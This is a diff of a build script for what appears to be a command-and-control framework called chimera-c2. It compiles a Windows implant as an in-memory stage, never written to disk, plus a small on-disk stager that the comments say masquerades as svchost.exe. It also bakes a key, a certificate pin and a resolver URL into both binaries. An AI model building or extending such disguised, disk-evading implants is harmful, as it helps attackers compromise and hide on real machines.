@@ -24,12 +24,26 @@ fi
 PIN=$(openssl x509 -in server/server.crt -outform DER | sha256sum | cut -d' ' -f1)
 echo "[*] Cert pin: $PIN"
 
-# Copy the malleable profile into the implant package (required by go:embed)
-cp "$PROJECT_DIR/profile.json" "$SCRIPT_DIR/profile.json"
+# Copy the malleable profile into the common package (required by go:embed)
+cp "$PROJECT_DIR/profile.json" "$SCRIPT_DIR/internal/common/profile.json"
 
+LDFLAGS="-s -w \
+-X github.com/terancebana/chimera-c2/implant/internal/common.StaticKeyHex=$KEY \
+-X github.com/terancebana/chimera-c2/implant/internal/common.CertPinHex=$PIN \
+-X github.com/terancebana/chimera-c2/implant/internal/common.ResolverURL=https://localhost:8080"
+
+# Build the in-memory STAGE (the full implant, never written to disk)
 GOOS=windows GOARCH=amd64 go build \
-    -ldflags "-s -w -X main.staticKeyHex=$KEY -X main.certPinHex=$PIN -X main.RESOLVER_URL=https://localhost:8080" \
-    -o implant/implant.exe \
+    -ldflags "$LDFLAGS" \
+    -o stage/stage.exe \
     ./implant/
 
-echo "[+] Build complete: implant/implant.exe"
+echo "[+] Stage built: stage/stage.exe"
+
+# Build the on-disk STAGER (tiny loader; drops as svchost.exe)
+GOOS=windows GOARCH=amd64 go build \
+    -ldflags "$LDFLAGS" \
+    -o implant/stager.exe \
+    ./implant/stager/
+
+echo "[+] Stager built: implant/stager.exe"
